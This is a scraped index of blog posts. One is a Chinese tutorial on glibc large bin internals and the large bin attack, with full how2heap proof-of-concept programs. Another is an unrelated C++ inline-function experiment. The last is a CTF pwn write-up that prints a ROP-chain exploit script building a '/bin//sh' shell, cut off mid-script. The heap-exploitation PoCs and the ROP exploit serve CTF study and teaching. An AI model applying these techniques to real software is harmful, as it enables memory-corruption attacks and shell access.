nb），就判定为符合条件的chunk，直接停止查找，将其从unsorted bin中取出返回 如果到unsorted bin为空都没有找到符合条件的chunk，那么就从small bin或者large bin中寻找可以分割的或者大小刚好的chunk 也就是说，如果要分割chunk，会将他们先放进small bin或者large bin中再分割，再把剩余部分放进unsorted bin中：\n测试程序1 调试以下程序可以发现，glibc在查找到一个可以分割的chunk的时候不会退出查找：\n#include\u0026lt;stdlib.h\u0026gt; int main() { void* p1 = malloc(2048); malloc(16); void* p2 = malloc(3072); malloc(16); void* p3 = malloc(2048); malloc(16); void* p4 = malloc(2048); malloc(16); free(p1); free(p2); free(p3); free(p4); p1 = malloc(3000); return 0; } 当free完这些大chunk的时候，他们都在unsorted bin中\n但是当malloc(3000)的时候，他们都进入了unsorted bin中，然后其中一个被取出分割后放回了unsorted bin中\n调试程序2 调试以下程序可以发现，程序在遇到大小刚刚好的chunk的时候会直接退出查找，同时也印证了可以分割的chunk会先进入large bin或small bin：\n#include\u0026lt;stdlib.h\u0026gt; int main() { void* p1 = malloc(2048); malloc(16); void* p2 = malloc(2048); malloc(16); void* p3 = malloc(3072); malloc(16); void* p4 = malloc(2048); malloc(16); void* p5 = malloc(3072); malloc(16); void* p6 = malloc(3000); malloc(16); void* p7 = malloc(2048); malloc(16); free(p1); free(p2); free(p3); free(p4); free(p5); free(p6); free(p7); p1 = malloc(3000); return 0; } 在malloc(3000)前：\n之后：\nlarge bin的结构？ 一共有136个bin，fast bin是一个单独的数组，其中有10个bin，剩下的126个bin是另一个数组，这126个bin中序号1是unsorted bin，序号2到序号63是small bin，64到126是large bin，当chunk大于512Byte（64位下是1024Byte）\n那么large bin的这63个bin是如何组织的呢？\n组 数量 公差 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 不限制 这些bin分为6组，每一组中的bin的大小之间有一个固定的公差。以 32 位平台的 large bin 为例，第一个 large bin 的起始 chunk 大小为 512 字节，位于第一组，所以该 bin 可以存储的 chunk 的大小范围为 [512,512+64)。\n一共有136个bin，为了知道这个放进large bin中的chunk放进这136个bin中的哪个bin，源码使用宏来计算：\n#define largebin_index_32(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 38) \\ ? 56 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 45) \\ ? 49 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \u0026lt;= 48) \\ ? 48 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 6) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \u0026lt;= 20) \\ ? 91 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 9) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \u0026lt;= 10) \\ ? 110 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 12) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \u0026lt;= 4) \\ ? 119 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 15) \\ : ((((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \u0026lt;= 2) \\ ? 124 + (((unsigned long) (sz)) \u0026gt;\u0026gt; 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) 如果我们先malloc六个堆块，实际大小为0x400，0x410，0x420，0x420，0x430，0x430，然后我们依次free可以得到下面这幅图：\n（图源自浅析largebin attack - 先知社区）\n其中我们看到，在large bin中我们使用了新的两个域fd_nextsize和bk_nextsize，他们在malloc_chunk结构体的位置如下：\nfd_nextsize用于指向同组的bins中下一个更小的bin，bk_nextsize用于指向同组的bins中下一个更大的bin。同时它是双向链表，所以两头的chunk会互相指向。\n下面内容来自堆相关数据结构 - CTF Wiki\nfd，bk chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理 fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列（也就是说，fd指向变小的方向）。这样做可以避免在寻找合适 chunk 时挨个遍历。\nLarge bin Attack基本原理概述 基本原理是，当chunk插入large bin中的时候，会改变原有chunk的fd、bk等，而如果我们在这几个域中填入我们自定义的数据，就可以改变某处的数据为此时插入chunk的指针值。\n有一点类似于unlink的原理，但是利用方法截然不同。large bin attack可以更改两个位置上的值为p3的指针，这个值往往挺大的，可以更改一些东西的阈限值，比如增大tcache的最大大小以使用tcache poison等。\n和unsorted bin attack一样可以打辅助，但是它更强的一点是我们可以知道填入的数据是一个什么样的值。\n例子解释（2.30以前） 使用how2heap/large_bin_attack.c at master · shellphish/how2heap · GitHub作为例子：\n/* This technique is taken from https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/ [...] else { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } bck = fwd-\u0026gt;bk; [...] mark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; For more details on how large-bins are handled and sorted by ptmalloc, please check the Background section in the aforementioned link. [...] */ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;assert.h\u0026gt; int main() { fprintf(stderr, \u0026#34;This file demonstrates large bin attack by writing a large unsigned long value into stack\\n\u0026#34;); fprintf(stderr, \u0026#34;In practice, large bin attack is generally prepared for further attacks, such as rewriting the \u0026#34; \u0026#34;global variable global_max_fast in libc for further fastbin attack\\n\\n\u0026#34;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, \u0026#34;Let\u0026#39;s first look at the targets we want to rewrite on stack:\\n\u0026#34;); fprintf(stderr, \u0026#34;stack_var1 (%p): %ld\\n\u0026#34;, \u0026amp;stack_var1, stack_var1); fprintf(stderr, \u0026#34;stack_var2 (%p): %ld\\n\\n\u0026#34;, \u0026amp;stack_var2, stack_var2); unsigned long *p1 = malloc(0x420); fprintf(stderr, \u0026#34;Now, we allocate the first large chunk on the heap at: %p\\n\u0026#34;, p1 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34; the first large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p2 = malloc(0x500); fprintf(stderr, \u0026#34;Then, we allocate the second large chunk on the heap at: %p\\n\u0026#34;, p2 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with\u0026#34; \u0026#34; the second large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); unsigned long *p3 = malloc(0x500); fprintf(stderr, \u0026#34;Finally, we allocate the third large chunk on the heap at: %p\\n\u0026#34;, p3 - 2); fprintf(stderr, \u0026#34;And allocate another fastbin chunk in order to avoid consolidating the top chunk with\u0026#34; \u0026#34; the third large chunk during the free()\\n\\n\u0026#34;); malloc(0x20); free(p1); free(p2); fprintf(stderr, \u0026#34;We free the first and second large chunks now and they will be inserted in the unsorted bin:\u0026#34; \u0026#34; [ %p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr, \u0026#34;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the\u0026#34; \u0026#34; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation\u0026#34; \u0026#34;, and reinsert the remaining of the freed first large chunk into the unsorted bin:\u0026#34; \u0026#34; [ %p ]\\n\\n\u0026#34;, (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr, \u0026#34;Now, we free the third large chunk and it will be inserted in the unsorted bin:\u0026#34; \u0026#34; [ %p \u0026lt;--\u0026gt; %p ]\\n\\n\u0026#34;, (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr, \u0026#34;Now emulating a vulnerability that can overwrite the freed second large chunk\u0026#39;s \\\u0026#34;size\\\u0026#34;\u0026#34; \u0026#34; as well as its \\\u0026#34;bk\\\u0026#34; and \\\u0026#34;bk_nextsize\\\u0026#34; pointers\\n\u0026#34;); fprintf(stderr, \u0026#34;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk\u0026#34; \u0026#34; at the head of the large bin freelist. To overwrite the stack variables, we set \\\u0026#34;bk\\\u0026#34; to 16 bytes before stack_var1 and\u0026#34; \u0026#34; \\\u0026#34;bk_nextsize\\\u0026#34; to 32 bytes before stack_var2\\n\\n\u0026#34;); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026amp;stack_var1 - 2); p2[3] = (unsigned long)(\u0026amp;stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr, \u0026#34;Let\u0026#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist.\u0026#34; \u0026#34; During this time, targets should have already been rewritten:\\n\u0026#34;); fprintf(stderr, \u0026#34;stack_var1 (%p): %p\\n\u0026#34;, \u0026amp;stack_var1, (void *)stack_var1); fprintf(stderr, \u0026#34;stack_var2 (%p): %p\\n\u0026#34;, \u0026amp;stack_var2, (void *)stack_var2); // sanity check assert(stack_var1 != 0); assert(stack_var2 != 0); return 0; } 在Ubuntu18下保存为test.c，使用命令gcc -g test.c -otest编译\n一开始我们初始化两个栈上变量，这也是我们等会需要修改的变量：\nunsigned long stack_var1 = 0; unsigned long stack_var2 = 0; 然后我们分配三个大chunk并用小chunk隔开，第一个大chunk用来处理后续的分割请求：\nunsigned long *p1 = malloc(0x420); malloc(0x20); unsigned long *p2 = malloc(0x500); malloc(0x20); unsigned long *p3 = malloc(0x500); malloc(0x20); 然后我们释放掉p1、p2，他们会先进入unsorted bin中。然后我们申请0x90的内存，这时候会把p2放进large bin中，将p1取出分割后放回unsorted bin中。\nfree(p1); free(p2); malloc(0x90); 这一步是为了让p2提前于p3进入large bin中，使用p1是为了防止分割p2导致其回到unsorted bin中。\n下一步我们就释放掉p3：\nfree(p3); 然后我们假设有这么一个漏洞，可以更改p2的size域、bk域、bk_nextsize域：\np2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(\u0026amp;stack_var1 - 2); p2[3] = (unsigned long)(\u0026amp;stack_var2 - 4); 我们改小p2的size，这样插入p3的时候，由于bk、bk_nextsize都指向变大的方向，因此p3会继承p2的bk、bk_nextsize并且将p2的fd和原先p2指向的下一个chunk（也就是p2-\u0026gt;bk）的bk指向p3\n而这时，如果将p3插入large bin，那么由于bk指向更大的一个空闲的chunk，因此p2-\u0026gt;bk会被更改为p3，同时，p2-\u0026gt;bk原先的值的fd会指向p3，这也就是说：\nbck = p2-\u0026gt;bk; p2-\u0026gt;bk = p3; bck-\u0026gt;fd = p3; 而由于我们将p2-\u0026gt;bk改为了\u0026amp;stack_var1-2，因此p2-\u0026gt;bk-\u0026gt;fd就是stack_var1\n相关源码为：\nmark_bin (av, victim_index); victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd; fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; 同理，bk_nextsize也可以用这个方法利用：\nelse { P3-\u0026gt;fd_nextsize = P2; //P3的fd_nextsize要修改成P2的头指针 P3-\u0026gt;bk_nextsize = P2-\u0026gt;bk_nextsize; //P3的bk_nextsize要修改成P2的bk_nextsize指向的地址 P2-\u0026gt;bk_nextsize = P3; //P2的bk_nextsize要修改成P3的头指针 P3-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = P3; //P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针 } bck = P2-\u0026gt;bk; //bck等于P2的bk 这里存在一个大小的判断，具体的解析见好好说话之Large Bin Attack_hollk的博客-CSDN博客\n例子解释（2.30以后） 在2.30以后，glibc为large bin attack新增了两个检查，这里以how2heap/large_bin_attack.c at master · shellphish/how2heap · GitHub为例：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;assert.h\u0026gt; /* A revisit to large bin attack for after glibc2.30 Relevant code snippet : if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)){ fwd = bck; bck = bck-\u0026gt;bk; victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } */ int main(){ /*Disable IO buffering to prevent stream from interfering with heap*/ setvbuf(stdin,NULL,_IONBF,0); setvbuf(stdout,NULL,_IONBF,0); setvbuf(stderr,NULL,_IONBF,0); printf(\u0026#34;\\n\\n\u0026#34;); printf(\u0026#34;Since glibc2.30, two new checks have been enforced on large bin chunk insertion\\n\\n\u0026#34;); printf(\u0026#34;Check 1 : \\n\u0026#34;); printf(\u0026#34;\u0026gt; if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd))\\n\u0026#34;); printf(\u0026#34;\u0026gt; malloc_printerr (\\\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\\\u0026#34;);\\n\u0026#34;); printf(\u0026#34;Check 2 : \\n\u0026#34;); printf(\u0026#34;\u0026gt; if (bck-\u0026gt;fd != fwd)\\n\u0026#34;); printf(\u0026#34;\u0026gt; malloc_printerr (\\\u0026#34;malloc(): largebin double linked list corrupted (bk)\\\u0026#34;);\\n\\n\u0026#34;); printf(\u0026#34;This prevents the traditional large bin attack\\n\u0026#34;); printf(\u0026#34;However, there is still one possible path to trigger large bin attack. The PoC is shown below : \\n\\n\u0026#34;); printf(\u0026#34;====================================================================\\n\\n\u0026#34;); size_t target = 0; printf(\u0026#34;Here is the target we want to overwrite (%p) : %lu\\n\\n\u0026#34;,\u0026amp;target,target); size_t *p1 = malloc(0x428); printf(\u0026#34;First, we allocate a large chunk [p1] (%p)\\n\u0026#34;,p1-2); size_t *g1 = malloc(0x18); printf(\u0026#34;And another chunk to prevent consolidate\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); size_t *p2 = malloc(0x418); printf(\u0026#34;We also allocate a second large chunk [p2] (%p).\\n\u0026#34;,p2-2); printf(\u0026#34;This chunk should be smaller than [p1] and belong to the same large bin.\\n\u0026#34;); size_t *g2 = malloc(0x18); printf(\u0026#34;Once again, allocate a guard chunk to prevent consolidate\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); free(p1); printf(\u0026#34;Free the larger of the two --\u0026gt; [p1] (%p)\\n\u0026#34;,p1-2); size_t *g3 = malloc(0x438); printf(\u0026#34;Allocate a chunk larger than [p1] to insert [p1] into large bin\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); free(p2); printf(\u0026#34;Free the smaller of the two --\u0026gt; [p2] (%p)\\n\u0026#34;,p2-2); printf(\u0026#34;At this point, we have one chunk in large bin [p1] (%p),\\n\u0026#34;,p1-2); printf(\u0026#34; and one chunk in unsorted bin [p2] (%p)\\n\u0026#34;,p2-2); printf(\u0026#34;\\n\u0026#34;); p1[3] = (size_t)((\u0026amp;target)-4); printf(\u0026#34;Now modify the p1-\u0026gt;bk_nextsize to [target-0x20] (%p)\\n\u0026#34;,(\u0026amp;target)-4); printf(\u0026#34;\\n\u0026#34;); size_t *g4 = malloc(0x438); printf(\u0026#34;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\\n\u0026#34;, p2-2, p2-2); printf(\u0026#34;Since glibc does not check chunk-\u0026gt;bk_nextsize if the new inserted chunk is smaller than smallest,\\n\u0026#34;); printf(\u0026#34; the modified p1-\u0026gt;bk_nextsize does not trigger any error\\n\u0026#34;); printf(\u0026#34;Upon inserting [p2] (%p) into largebin, [p1](%p)-\u0026gt;bk_nextsize-\u0026gt;fd-\u0026gt;nexsize is overwritten to address of [p2] (%p)\\n\u0026#34;, p2-2, p1-2, p2-2); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\\n\u0026#34;, p2-2, (void *)target); printf(\u0026#34;Target (%p) : %p\\n\u0026#34;,\u0026amp;target,(size_t*)target); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;====================================================================\\n\\n\u0026#34;); assert((size_t)(p2-2) == target); return 0; } 因为传统的large bin attack依赖于对bk和bk_nextsize的修改，所以glibc在这两个上面加了检查：\n// fwd = p2 // bck = p2-\u0026gt;bk if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd)) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\u0026#34;); if (bck-\u0026gt;fd != fwd) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (bk)\u0026#34;); 这就要求传统的large bin attack中fwd-\u0026gt;bk_nextsize指向的伪造的chunk的fd_nextsize的值是fwd（互相联通）；要求fwd-\u0026gt;bk指向的伪造的chunk的fd的值是fwd。\n然而这个检查有个巨大的漏洞就是，当插入chunk的大小比这个bin中最小的chunk的大小都要小的时候，是不会执行这两个检查的：\n// 如果请求大小比该 large bin 中最小的块还小，则跳过下面的循环 assert (chunk_main_arena (bck-\u0026gt;bk)); if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; // 将 victim 插入到 fwd 的前面 victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } 因此，当我们将一个更小的chunk插入有一个chunk的large bin（两者的index一样）时，相当于反向地进行传统的large bin attack\n其中，victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim就相当于fwd-\u0026gt;fd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim相当于p1-\u0026gt;bk_nextsize-\u0026gt;fd_nexsize = victim，而p1-\u0026gt;bk_nextsize被我们修改成了(size_t)((\u0026amp;target)-4)，因此此时就会把target修改成victim，也就是p2的指针\np1[3] = (size_t)((\u0026amp;target)-4); 相关源码 以下源码注释来自chatgpt\nif (in_smallbin_range (size)) // 如果请求大小在 small bin 的范围内 { // 找到 victim 所在的 small bin 的索引 victim_index = smallbin_index (size); // bck 指向 small bin 起始块 bck = bin_at (av, victim_index); // fwd 指向下一个 small bin 的起始块 fwd = bck-\u0026gt;fd; } else // 请求大小在 large bin 的范围内 { // 找到 victim 所在的 large bin 的索引 victim_index = largebin_index (size); // bck 指向 large bin 起始块 bck = bin_at (av, victim_index); // fwd 指向 large bin 起始块的下一个块 fwd = bck-\u0026gt;fd; // 维护 large bin 的有序性 if (fwd != bck) // 如果该 large bin 中有一个或更多空闲块 { // 将 size 和 PREV_INUSE 按位或以加速比较 size |= PREV_INUSE; // 如果请求大小比该 large bin 中最小的块还小，则跳过下面的循环 assert (chunk_main_arena (bck-\u0026gt;bk)); if ((unsigned long) (size) \u0026lt; (unsigned long) chunksize_nomask (bck-\u0026gt;bk)) { fwd = bck; bck = bck-\u0026gt;bk; // 将 victim 插入到 fwd 的前面 victim-\u0026gt;fd_nextsize = fwd-\u0026gt;fd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;fd-\u0026gt;bk_nextsize; fwd-\u0026gt;fd-\u0026gt;bk_nextsize = victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } else // 在 large bin 中顺序查找符合请求大小的块 { assert (chunk_main_arena (fwd)); while ((unsigned long) size \u0026lt; chunksize_nomask (fwd)) { fwd = fwd-\u0026gt;fd_nextsize; assert (chunk_main_arena (fwd)); } if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd)) // 总是将 victim 插入到第二个位置 fwd = fwd-\u0026gt;fd; else // 插入到适当的位置 { victim-\u0026gt;fd_nextsize = fwd; victim-\u0026gt;bk_nextsize = fwd-\u0026gt;bk_nextsize; if (__glibc_unlikely (fwd-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize != fwd)) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (nextsize)\u0026#34;); fwd-\u0026gt;bk_nextsize = victim; victim-\u0026gt;bk_nextsize-\u0026gt;fd_nextsize = victim; } // 更新 bck bck = fwd-\u0026gt;bk; if (bck-\u0026gt;fd != fwd) malloc_printerr (\u0026#34;malloc(): largebin double linked list corrupted (bk)\u0026#34;); } } else // 该 large bin 中一个空闲块也没有 victim-\u0026gt;fd_nextsize = victim-\u0026gt;bk_nextsize = victim; } // 将该 bin 标记为非空闲状态 mark_bin (av, victim_index); // 将 victim 插入到 bck 和 fwd 之间 victim-\u0026gt;bk = bck; victim-\u0026gt;fd = fwd fwd-\u0026gt;bk = victim; bck-\u0026gt;fd = victim; ","date":"2023年02月20日","permalink":"https://peterliuzhi.top/principle/largebin_attack/","section":"principle","summary":"When you begin to touch your heart or let your heart be touched, you begin to discover that it\u0026rsquo;s bottomless. — Pema Chödrön Large bin的数据结构 何时会进入large bin中？ Large bin用来储存释放掉的大chunk。 当释放","tags":["pwn","largebin","heap"],"title":"Largebin_Attack"},{"categories":["posts","C++","develop"],"contents":" Numberless are the worlds wonders, but none more wonderful than man. — Sophocles\n引入 在C++中我们经常使用inline内联函数来代替宏，而宏是在预编译阶段进行简单的替换，那内联函数会产生什么效果呢？\n我写了一个简单的小程序来验证这个问题：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string\u0026gt; #define ONE 1 inline char _IndexFromEnd(std::string\u0026amp; num_str, char position) { // 如果越界，返回\u0026#39;0\u0026#39;，在StringNumAddOrSub中计算会得到0 if (position \u0026gt;= num_str.length()) return \u0026#39;0\u0026#39;; // 从后往前数 return num_str.at((num_str.length() - 1) - position); } inline char get_one(){ return ONE; } int\tmain(int argc, char **argv) { std::string num = \u0026#34;123456\u0026#34;; char a = _IndexFromEnd(num, 1); char b = _IndexFromEnd(num, 100); char c = get_one(); putchar(a); putchar(\u0026#39; \u0026#39;); putchar(b); putchar(\u0026#39; \u0026#39;); putchar(c); return 0; } 然后得到了预编译结果、普通编译链接结果、优化编译链接结果：\n查看预编译结果 预编译器将include的头文件简单地复制到了我们代码中include的位置，因此最后我们得到的预编译结果中，我们自己写的代码位于六万多行的位置：\n可以看到，我们define的宏ONE已经被简单地替换掉了，但是inline函数并没有进行替换\n查看普通编译链接结果 我们使用ida进行反编译后可以看到这里内联函数并没有嵌入到主函数之中，而是像一个普通的函数一样被调用\n而且同样有传参的操作：\n或许这就是内联函数能够被调试的原因——在调试版本的程序中，它和普通函数并没有什么区别\n优化编译链接结果 优化后我们发现主函数已经变成了我们不认识的样子：\n而其中那个只是返回了1的内联函数直接消失了，变成了常量值被打印出来：\n而这里sub_1004016B0函数也不再是我们写的内联函数，而是变成了混合了basic_string中的一个函数（应该就是我们在内联函数中调用的at函数）的函数，或者说，它将at函数嵌入到了我们的函数中：\n而同时我们可以查看at的源代码：\n会发现这个函数的返回值是被constexpr修饰的，说明这是一个在编译器确定的常量\n如果我们将get_one确定为constexpr返回值的函数，则它一定会在编译期进行计算，就算加上-g：\n与非内联函数对比 我们试着与非内联函数对比：\n在-g的时候并没有区别：\n然后我们再看下-O2的时候：\n这完全没差嘛！所以说如果你自己都不知道内联会怎么发生，就不要期望内联真正起效了。\n如果我们将代码中的复杂返回逻辑改掉，我们会发现内联\u0026quot;发生\u0026quot;了：\n这看上去好像没有发生内联，但是我们查看sub_1004016B0函数会发现，由于内联函数内调用了另一个函数，因此我们得到的最终结果还是一个函数。\n但是由于优化开启，所以就算是普通函数也会变成这样，并没有什么差别。也就是说，这样的内联并无意义（因为不开启优化内联不会发生）\n因此，不要在内联函数内进行嵌套调用（或者递归）\n内联函数嵌套调用内联函数 那如果我嵌套调用的是一个内联函数呢，情况会不会发生变化？\n答案是确定的，优化开启的情况下，编译器直接计算出了结果：\n而在-g的情况下，编译器甚至连这种常量结果都没有计算出来：\n或许你会问，如果返回值不是一个字面常量呢？就像下面这样：\n显然内联发生了：\n因此，一个返回逻辑简单的内联函数调用另一个返回逻辑简单的内联函数在优化开启的情况下确实是会发生内联的\n结论 因此，我们通过这些简略的事实能够得到一个粗糙的结论：\n内联函数在编译器优化之前和普通函数并无差别，在优化之后一些具有较复杂返回逻辑的内联函数也无法内联。同时就算返回逻辑简单，也要避免嵌套非内联函数，因为这在优化开启的情况下并无意义。\n因此，如果函数返回的值是一个在编译期能够确定的常值，尽量使用constexpr修饰返回值；不要嵌套非内联函数，不要复杂化内联函数的返回逻辑\n可见，内联函数的实现较为复杂，如果期望通过内联函数优化程序，一定要谨慎行事，因为虽然内联函数至少不会让程序性能降低，但是会给代码阅读者造成困惑并将他们的思路引导向错误的方向，某种意义上来说，它让代码文字的“效率”降低了\n✍️作者还是C++初学者，因对内联函数的行为有所疑惑才试图用自己笨拙的方式探寻真相，如果错漏，敬请见谅🙏\n","date":"2023年02月07日","permalink":"https://peterliuzhi.top/posts/c++%E4%B8%ADinline%E5%87%BD%E6%95%B0%E6%9C%80%E7%BB%88%E9%80%A0%E6%88%90%E4%BA%86%E4%BB%80%E4%B9%88%E6%95%88%E6%9E%9C/","section":"posts","summary":"Numberless are the worlds wonders, but none more wonderful than man. — Sophocles 引入 在C++中我们经常使用inline内联函数来代替宏，而宏是在预编译阶段进行简单的替换，那内联函数会产生什么效果呢？ 我写了","tags":["C++","inline"],"title":"C++中inline函数最终造成了什么效果？"},{"categories":["writeup"],"contents":" Never mistake motion for action. — Ernest Hemingway\nsictf_pwn\nC@na2y checksec查看程序架构 ida查看伪C代码 法一：直接用ropper或者ROPgadget生成ROP链 最简单的方法，使用ropper或者ROPgadget生成（ROPgadget比较好，会区分bytes和str），可以直接getshell，但是我自己生成的时候却没有成功，出来的ROP链无法使用，这里放一下另一位大佬的exp：\n使用命令ROPgadget.py --binary pwn --ropchain生成：\nfrom pwn import * io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;ctf.qsnctf.com\u0026#39;,10499) from struct import pack # Padding goes here p = b\u0026#39;\u0026#39; p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da060) # @ .data #p += p32(0x080a90d6) # pop eax ; ret p += p32(0x08056464) # pop eax ; pop edx ; pop ebx ; ret p += b\u0026#39;/bin\u0026#39; p += p32(0x080da060)*2 # @ .data p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da064) # @ .data + 4 p += p32(0x08056464) # pop eax ; pop edx ; pop ebx ; ret #p += p32(0x080a90d6) # pop eax ; ret p += b\u0026#39;//sh\u0026#39; p += p32(0x080da064)*2 # @ .data + 4 p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da068) # @ .data + 8 p += p32(0x08056550) # xor eax, eax ; ret p += p32(0x08056f95) # mov dword ptr [edx], eax ; ret p += p32(0x080481c9) # pop ebx ; ret p += p32(0x080da060) # @ .data p += p32(0x0806ee52) # pop ecx ; pop ebx ; ret p += p32(0x080da068) # @ .data + 8 p += p32(0x080da060) # padding without overwrite ebx p += p32(0x0806ee2b) # pop edx ; ret p += p32(0x080da068) # @ .data + 8 p += 